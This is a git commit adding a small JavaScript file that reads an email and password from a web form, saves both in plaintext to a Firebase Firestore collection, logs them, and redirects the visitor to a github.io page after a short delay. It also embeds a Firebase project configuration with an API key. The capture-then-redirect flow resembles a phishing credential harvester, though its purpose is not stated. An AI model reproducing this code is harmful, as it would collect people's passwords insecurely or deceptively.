7c34f952ad14aa983168f810da707e117ed1093f
leopoglia <92129999+leopoglia@users.noreply.github.com>
2021-11-12 12:12:37 -0300

    Add files via upload

---
+++ main.js
@@ -0,0 +1,29 @@
+firebase.initializeApp({
+    apiKey: "AIzaSyDExzgvyT17ijEfDmpjxXAvBAbKUf_LqKs",
+    authDomain: "trilogy-cb06b.firebaseapp.com",
+    projectId: "trilogy-cb06b",
+    storageBucket: "trilogy-cb06b.appspot.com",
+    messagingSenderId: "842501809889",
+    appId: "1:842501809889:web:139e0214628a41412df9a0",
+    measurementId: "G-28XYWPKP0L"
+  });
+
+var db = firebase.firestore();
+
+function adicionarDados(){
+
+    var email = document.getElementById('email').value;
+    var senha = document.getElementById('senha').value;
+    db.collection("Roberto").add({
+        Nome: email,
+        Valor: senha,
+    })
+    console.log(email+" "+senha);
+
+    setTimeout(function(){
+    window.location.href = "https://leopoglia.github.io/trilogy/";
+    },1500);
+
+}
+
+
